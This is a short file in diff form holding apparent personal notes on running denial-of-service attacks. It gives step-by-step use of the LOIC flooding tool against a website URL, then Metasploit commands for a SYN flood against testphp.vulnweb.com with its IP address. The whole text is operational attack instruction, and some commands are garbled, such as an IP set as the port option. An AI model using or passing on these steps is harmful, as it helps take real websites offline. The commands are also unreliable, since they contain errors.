@@ -1,0 +1,21 @@
+hoic
+Loic
+Step 1: Run the tool. 
+Step 2: Enter the URL of the website in The URL field and click on Lock O. Then, 
+select attack method (TCP, UDP or HTTP). I will recommend TCP to start. These 2 
+options are necessary to start the attack. 
+ Change other parameters per your choice or leave it to the default. Now click on the 
+Big Button labeled as “IMMA CHARGIN MAH LAZER.” You have just mounted an attack 
+on the target.
+
+metasplot dos attack
+  kali terminal
+ ping testphp.vulnweb.com    //IP Address 18.192.182.30.
+  msfconsole in your kali terminal
+Msf6 > use auxiliary/dos/tcp/synflood 
+Msf6> show options 
+type set and the option name and option.
+type Set RPORT 18.192.182.30 
+Set RPORT 80 
+type exploit
+open wireshark to see packet
